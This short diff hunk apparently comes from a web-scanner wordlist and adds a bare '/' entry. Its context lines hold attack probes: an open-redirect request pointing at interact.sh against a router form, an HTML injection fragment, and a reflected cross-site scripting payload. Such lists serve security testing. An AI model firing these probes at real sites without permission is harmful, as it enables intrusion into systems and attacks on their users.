@@ -158,3 +158,4 @@
 /boafrm/formWlanRedirect?redirect-url=http://interact.sh&wlan_id=1
 /Forms/rpAuth_1?id=</form><iMg%20src=x%20onerror=
 /?page</script><script>alert(document.domain)</script>
+/
